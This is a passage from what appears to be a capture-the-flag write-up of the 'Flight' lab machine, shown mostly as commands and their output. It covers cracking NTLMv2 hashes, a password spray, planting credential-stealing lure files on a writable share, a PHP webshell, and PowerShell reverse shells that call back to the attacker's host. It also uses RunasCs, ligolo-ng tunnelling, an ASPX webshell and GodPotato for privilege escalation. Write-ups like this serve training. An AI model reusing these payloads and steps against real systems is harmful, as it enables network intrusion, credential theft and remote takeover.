+SVC_APACHE::flight:8a3c1b3635d676a8:25ed2e661a0bcdb469dee5868b951daf:0101000000000000003ddda82ec1dc01c7b08dbe2b3fdecc0000000002000800360045004300320001001e00570049004e002d0034004e005000380034004b004a00390035005400550004003400570049004e002d0034004e005000380034004b004a0039003500540055002e0036004500430032002e004c004f00430041004c000300140036004500430032002e004c004f00430041004c000500140036004500430032002e004c004f00430041004c0007000800003ddda82ec1dc0106000400020000000800300030000000000000000000000000300000fb840a9349d10ed9f2c6048a7d2e4af1afb055f5e509f4ff113d3d01b3d9ec580a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390030000000000000000000:S@Ss!K@*t13</code></pre><p>Ive cracked the hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">svc_apache:S@Ss!K@*t13</code></pre><p>I will now validate these creds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb g0.flight.htb -u svc_apache -p &#39;S@Ss!K@*t13&#39;  
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13</code></pre><p>I have compromised this user</p><h2>Access as <code>svc_apache</code></h2><h3>SMB shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb g0.flight.htb -u svc_apache -p &#39;S@Ss!K@*t13&#39; --shares
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         10.129.228.120  445    G0               [*] Enumerated shares
+SMB         10.129.228.120  445    G0               Share           Permissions     Remark
+SMB         10.129.228.120  445    G0               -----           -----------     ------
+SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
+SMB         10.129.228.120  445    G0               C$                              Default share
+SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
+SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
+SMB         10.129.228.120  445    G0               Shared          READ            
+SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
+SMB         10.129.228.120  445    G0               Users           READ            
+SMB         10.129.228.120  445    G0               Web             READ </code></pre><p>Read access on default shares</p><p>Read access on <code>Shared</code> <code>Users</code> and <code>Web</code></p><h3>Users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb g0.flight.htb -u svc_apache -p &#39;S@Ss!K@*t13&#39; --users-export users.txt 
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         10.129.228.120  445    G0               -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.129.228.120  445    G0               Administrator                 2022-09-22 20:17:02 0       Built-in account for administering the computer/domain
+SMB         10.129.228.120  445    G0               Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain
+SMB         10.129.228.120  445    G0               krbtgt                        2022-09-22 19:48:01 0       Key Distribution Center Service Account
+SMB         10.129.228.120  445    G0               S.Moon                        2022-09-22 20:08:22 0       Junion Web Developer
+SMB         10.129.228.120  445    G0               R.Cold                        2022-09-22 20:08:22 0       HR Assistant
+SMB         10.129.228.120  445    G0               G.Lors                        2022-09-22 20:08:22 0       Sales manager
+SMB         10.129.228.120  445    G0               L.Kein                        2022-09-22 20:08:22 0       Penetration tester
+SMB         10.129.228.120  445    G0               M.Gold                        2022-09-22 20:08:22 0       Sysadmin
+SMB         10.129.228.120  445    G0               C.Bum                         2022-09-22 20:08:22 0       Senior Web Developer
+SMB         10.129.228.120  445    G0               W.Walker                      2022-09-22 20:08:22 0       Payroll officer
+SMB         10.129.228.120  445    G0               I.Francis                     2022-09-22 20:08:22 0       Nobody knows why he&#39;s here
+SMB         10.129.228.120  445    G0               D.Truff                       2022-09-22 20:08:22 0       Project Manager
+SMB         10.129.228.120  445    G0               V.Stevens                     2022-09-22 20:08:22 0       Secretary
+SMB         10.129.228.120  445    G0               svc_apache                    2022-09-22 20:08:23 0       Service Apache web
+SMB         10.129.228.120  445    G0               O.Possum                      2022-09-22 20:08:23 0       Helpdesk
+SMB         10.129.228.120  445    G0               [*] Enumerated 15 local users: flight
+SMB         10.129.228.120  445    G0               [*] Writing 15 local users to users.txt</code></pre><p>Dumped all the users on the domain to a file</p><p>Also got soem user descriptions which helps me understand the role of each user</p><p>AS-REP roasting and kerberoasting not possible</p><p>Bloodhound shows me nothing</p><h2>Password spray leads to user compromise</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb g0.flight.htb -u users.txt -p &#39;S@Ss!K@*t13&#39; --continue-on-success
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.120  445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
+SMB         10.129.228.120  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         10.129.228.120  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE</code></pre><p>As seen here there is another user with the same password</p><h3>Access as <code>s.moon</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb g0.flight.htb -u s.moon -p &#39;S@Ss!K@*t13&#39; --shares       
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.120  445    G0               [+] flight.htb\s.moon:S@Ss!K@*t13 
+SMB         10.129.228.120  445    G0               [*] Enumerated shares
+SMB         10.129.228.120  445    G0               Share           Permissions     Remark
+SMB         10.129.228.120  445    G0               -----           -----------     ------
+SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
+SMB         10.129.228.120  445    G0               C$                              Default share
+SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
+SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
+SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
+SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
+SMB         10.129.228.120  445    G0               Users           READ            
+SMB         10.129.228.120  445    G0               Web             READ</code></pre><p>This user has write access to <code>Shared</code></p><p>Nothing in bloodhound so im going to try and exploit write access to the <code>shared</code> share</p><p>As previously identified there is nothing in the <code>shared</code> share so im going to try a watering hole attack</p><h2>Watering hole attack</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 ntlm_theft.py -g all -s 10.10.14.90 -f meeting   
+/home/kali/htb/flight/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence &#39;\l&#39;
+  location.href = &#39;ms-word:ofe|u|\\&#39;&#39;&#39; + server + &#39;&#39;&#39;\leak\leak.docx&#39;;
+Created: meeting/meeting.scf (BROWSE TO FOLDER)
+Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
+Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
+Created: meeting/meeting.lnk (BROWSE TO FOLDER)
+Created: meeting/meeting.rtf (OPEN)
+Created: meeting/meeting-(stylesheet).xml (OPEN)
+Created: meeting/meeting-(fulldocx).xml (OPEN)
+Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(includepicture).docx (OPEN)
+Created: meeting/meeting-(remotetemplate).docx (OPEN)
+Created: meeting/meeting-(frameset).docx (OPEN)
+Created: meeting/meeting-(externalcell).xlsx (OPEN)
+Created: meeting/meeting.wax (OPEN)
+Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: meeting/meeting.asx (OPEN)
+Created: meeting/meeting.jnlp (OPEN)
+Created: meeting/meeting.application (DOWNLOAD AND OPEN)
+Created: meeting/meeting.pdf (OPEN AND ALLOW)
+Created: meeting/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
+Created: meeting/Autorun.inf (BROWSE TO FOLDER)
+Created: meeting/desktop.ini (BROWSE TO FOLDER)
+Created: meeting/meeting.theme (THEME TO INSTALL
+Generation Complete.</code></pre><p>First i generate a malicious collection of file that will link back to me</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><p>Then ill start the listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //g0.flight.htb/Shared -U &#39;s.moon&#39;%&#39;S@Ss!K@*t13&#39;
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; prompt off
+smb: \&gt; mput meeting*</code></pre><p>This planted the files in the share and after a minute</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[SMB] NTLMv2-SSP Client   : 10.129.228.120
+[SMB] NTLMv2-SSP Username : flight.htb\c.bum
+[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:72e73b57265df8af:4D22C1950359A10ADB96A074026CC863:010100000000000080B88D2434C1DC011E59E9C7DEB3A3A6000000000200080039004B004900570001001E00570049004E002D00530034004F00380036005A004200490059003300490004003400570049004E002D00530034004F00380036005A00420049005900330049002E0039004B00490057002E004C004F00430041004C000300140039004B00490057002E004C004F00430041004C000500140039004B00490057002E004C004F00430041004C000700080080B88D2434C1DC0106000400020000000800300030000000000000000000000000300000FB840A9349D10ED9F2C6048A7D2E4AF1AFB055F5E509F4FF113D3D01B3D9EC580A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390030000000000000000000</code></pre><p>Now i can attempt to crack this</p><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat c_bum.hash /usr/share/wordlists/rockyou.txt
+
+C.BUM::flight.htb:72e73b57265df8af:4d22c1950359a10adb96a074026cc863:010100000000000080b88d2434c1dc011e59e9c7deb3a3a6000000000200080039004b004900570001001e00570049004e002d00530034004f00380036005a004200490059003300490004003400570049004e002d00530034004f00380036005a00420049005900330049002e0039004b00490057002e004c004f00430041004c000300140039004b00490057002e004c004f00430041004c000500140039004b00490057002e004c004f00430041004c000700080080b88d2434c1dc0106000400020000000800300030000000000000000000000000300000fb840a9349d10ed9f2c6048a7d2e4af1afb055f5e509f4ff113d3d01b3d9ec580a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390030000000000000000000:Tikkycoll_431012284</code></pre><p>The hash cracked</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">c.bum:Tikkycoll_431012284</code></pre><p>Ill validate these credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb g0.flight.htb -u c.bum -p &#39;Tikkycoll_431012284&#39;  
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284</code></pre><p>This user has been compromised</p><h3>Access on shares as <code>c.bum</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb g0.flight.htb -u c.bum -p &#39;Tikkycoll_431012284&#39; --shares
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
+SMB         10.129.228.120  445    G0               [*] Enumerated shares
+SMB         10.129.228.120  445    G0               Share           Permissions     Remark
+SMB         10.129.228.120  445    G0               -----           -----------     ------
+SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
+SMB         10.129.228.120  445    G0               C$                              Default share
+SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
+SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
+SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
+SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
+SMB         10.129.228.120  445    G0               Users           READ            
+SMB         10.129.228.120  445    G0               Web             READ,WRITE</code></pre><p>Now i have write access on <code>Web</code> which as previously identified is where the webroot is held so i should be able to make a reverse shell as this user</p><h2>Reverse shell as <code>svc_apache</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;</code></pre><p>Since i know the page is running PHP i will start with this!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337                                      
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.1.150 • 172.18.0.1 • 172.17.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</code></pre><p>This set me a listener ready for a reverse shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //g0.flight.htb/Web -U &#39;c.bum&#39;%&#39;Tikkycoll_431012284&#39;
+smb: \&gt; cd school.flight.htb\
+smb: \school.flight.htb\&gt; put shell.php
+putting file shell.php as \school.flight.htb\shell.php (0.8 kB/s) (average 0.8 kB/s)
+smb: \school.flight.htb\&gt; </code></pre><p>This planted the shell now i can browse to it!</p><p><img src="images/flight/pasted-image-20260406003259.webp" alt="Screenshot" loading="lazy" /> As seen here i now have Remote Code Execution as this user</p><p>Soon after though the shell is removed from the share probably a cleanup script</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20%22%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient%28%2710.10.14.90%27%2C%201337%29%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream%28%29%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter%28%24NetworkStream%29%3Bfunction%20WriteToStream%20%28%24String%29%20%7B%5Bbyte%5B%5D%5D%24script%3ABuffer%20%3D%200..%24TCPClient.ReceiveBufferSize%20%7C%20%25%20%7B0%7D%3B%24StreamWriter.Write%28%24String%20%2B%20%27SHELL%3E%20%27%29%3B%24StreamWriter.Flush%28%29%7DWriteToStream%20%27%27%3Bwhile%28%28%24BytesRead%20%3D%20%24NetworkStream.Read%28%24Buffer%2C%200%2C%20%24Buffer.Length%29%29%20-gt%200%29%20%7B%24Command%20%3D%20%28%5Btext.encoding%5D%3A%3AUTF8%29.GetString%28%24Buffer%2C%200%2C%20%24BytesRead%20-%201%29%3B%24Output%20%3D%20try%20%7BInvoke-Expression%20%24Command%202%3E%261%20%7C%20Out-String%7D%20catch%20%7B%24_%20%7C%20Out-String%7DWriteToStream%20%28%24Output%29%7D%24StreamWriter.Close%28%29%22</code></pre><p>Ill use this payload <code>powershell #3</code> on revshells.com with some URL encoding ill then send this via <code>shell.php?cmd=</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337                                      
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.1.150 • 172.18.0.1 • 172.17.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] • G0 10.129.228.120 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 flight\svc_apache • Session ID &lt;1&gt;
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/G0~10.129.228.120-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_03_31-18_25_24-038.log
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+SHELL&gt; whoami
+flight\svc_apache
+SHELL&gt; </code></pre><p>I now have a shell</p><h3>Internal service running</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; netstat -ano | findstr LISTENING
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5392
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5392
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       920
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2776
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       500
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1252
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1624
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       640
+  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       2896
+  TCP    0.0.0.0:59126          0.0.0.0:0              LISTENING       2888</code></pre><p>As seen here there is an internal service running on here specifically port 8000</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; dir C:\inetpub\development
+
+
+    Directory: C:\inetpub\development
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        3/31/2026   5:27 PM                css                                                                   
+d-----        3/31/2026   5:27 PM                fonts                                                                 
+d-----        3/31/2026   5:27 PM                img                                                                   
+d-----        3/31/2026   5:27 PM                js                                                                    
+-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
+-a----        4/16/2018   2:23 PM          45949 index.html</code></pre><p>There also appears to be a directory in <code>inetpub</code> called <code>development</code> im starting to think this could be an internal web service</p><p>Looking at the privs i can see that it can be edited by <code>c.bum</code> i know his creds so i can simply upload RunAsCs.exe to see whats there</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; pwd
+
+Path                         
+----                         
+C:\Users\svc_apache\Documents
+
+
+SHELL&gt;powershell -c wget http://10.10.14.90:443/RunasCs.exe -o rac.exe
+SHELL&gt; dir
+
+
+    Directory: C:\Users\svc_apache\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        3/31/2026   5:39 PM          51712 rac.exe    </code></pre><p>Ive uploaded RunAsCs.exe to the target via a python webserver</p><p>Ill set another listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; ./rac.exe c.bum &#39;Tikkycoll_431012284&#39; -r 10.10.14.90:1338 cmd
+[*] Warning: The logon for user &#39;c.bum&#39; is limited. Use the flag combination --bypass-uac and --logon-type &#39;8&#39; to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-753dd$\Default
+[+] Async process &#39;C:\Windows\system32\cmd.exe&#39; with pid 1392 created in background.</code></pre><p>This sent the connection</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1338          
+[+] Listening for reverse shells on 0.0.0.0:1338 -&gt; 127.0.0.1 • 192.168.1.150 • 172.18.0.1 • 172.17.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] • G0 10.129.228.120 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 flight\c.bum • Session ID &lt;1&gt;
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/G0~10.129.228.120-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_03_31-18_41_04-982.log
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows\system32&gt;whoami
+whoami
+flight\c.bum
+
+C:\Windows\system32&gt;</code></pre><p>Now i have a shell as <code>c.bum</code></p><h2>Ligolo-ng to access internal web service</h2><p>First ill get the windows agent for amd64 and the linux proxy for amd64 from github</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 8000                           
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>Then ill setup a webserver to transfer the agent to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; powershell -c wget http://10.10.14.90:8000/agent.exe -o agent.exe</code></pre><p>This transferred it to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo ./proxy -selfcert
+
+ligolo-ng » ifcreate --name flight
+INFO[0072] Creating a new flight interface...           
+INFO[0072] Interface created!                           
+ligolo-ng » route_add --name flight --route 240.0.0.1/32
+INFO[0102] Route created.                               
+ligolo-ng »  </code></pre><p>This has configured ligolo-ng routing info</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; ./agent.exe -connect 10.10.14.90:11601 --ignore-cert</code></pre><p>This triggered a connection back to me on the svc_apache shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ligolo-ng » INFO[0002] Agent joined.                                 id=00505694ba82 name=&quot;flight\\svc_apache@g0&quot; remote=&quot;10.129.228.120:61155&quot;
+ligolo-ng » session
+? Specify a session : 1 - flight\svc_apache@g0 - 10.129.228.120:61155 - 00505694ba82
+[Agent : flight\svc_apache@g0] » tunnel_start --tun flight
+INFO[0055] Starting tunnel to flight\svc_apache@g0 (00505694ba82) 
+[Agent : flight\svc_apache@g0] »  </code></pre><p>This shows me getting the connection and starting the tunnel</p><p>Now if i go to <code>http://240.0.0.1:8000/</code> i should be able to access the internal service</p><p><img src="images/flight/pasted-image-20260406003315.webp" alt="Screenshot" loading="lazy" /> I now have access to the internal service</p><p>Now using my <code>c.bum</code> shell i can test out a shell by simply droping it in <code>development</code></p><p><a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx" target="_blank" rel="noreferrer">https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx</a></p><p>Ill use this shell here and transfer it by python webserver</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 1000
+Serving HTTP on 0.0.0.0 port 1000 (http://0.0.0.0:1000/) ...</code></pre><p>The shell is now hosted on my machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">C:\inetpub\development&gt;powershell -c wget http://10.10.14.90:1000/cmd.aspx -o cmd.aspx
+powershell -c wget http://10.10.14.90:1000/cmd.aspx -o cmd.aspx</code></pre><p>This transferred the file</p><p><img src="images/flight/pasted-image-20260406003333.webp" alt="Screenshot" loading="lazy" /> Now browsing to it i have a working webshell</p><p><img src="images/flight/pasted-image-20260406003343.webp" alt="Screenshot" loading="lazy" /> As seen here this is running as <code>defaultapppool</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1339           
+[+] Listening for reverse shells on 0.0.0.0:1339 -&gt; 127.0.0.1 • 192.168.1.150 • 172.17.0.1 • 172.18.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</code></pre><p>Ive set a listener</p><p>Now ill use this payload in the webshell:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient = New-Object Net.Sockets.TCPClient(&#39;10.10.14.90&#39;, 1339);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + &#39;SHELL&gt; &#39;);$StreamWriter.Flush()}WriteToStream &#39;&#39;;while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()&quot;</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1339           
+[+] Listening for reverse shells on 0.0.0.0:1339 -&gt; 127.0.0.1 • 192.168.1.150 • 172.17.0.1 • 172.18.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] • G0 10.129.228.120 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 iis apppool\defaultapppool • Session ID &lt;1&gt;
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/G0~10.129.228.120-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_04_01-16_29_28-140.log
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+SHELL&gt; whoami
+iis apppool\defaultapppool
+SHELL&gt; </code></pre><p>Now i have a shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SHELL&gt; </code></pre><p>I have got SeImpersonatePrivilege so i should be able to run GodPotato</p><p>Ill start be making a directory at <code>C:\Temp</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python"> python3 -m http.server 1001
+Serving HTTP on 0.0.0.0 port 1001 (http://0.0.0.0:1001/) ...</code></pre><p>Ive downloaded it from github and ill host it using this</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; powershell -c wget http://10.10.14.90:1001/GodPotato-NET4.exe -o godpotato.exe
+SHELL&gt; dir
+
+
+    Directory: C:\Temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----         4/1/2026   3:34 PM          57344 godpotato.exe                                                         
+
+
+SHELL&gt; </code></pre><p>This tranferred godpotato to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; ./godpotato.exe -cmd &quot;cmd /c whoami&quot;
+[*] CombaseModule: 0x140705258995712
+[*] DispatchTable: 0x140705261301824
+[*] UseProtseqFunction: 0x140705260678352
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
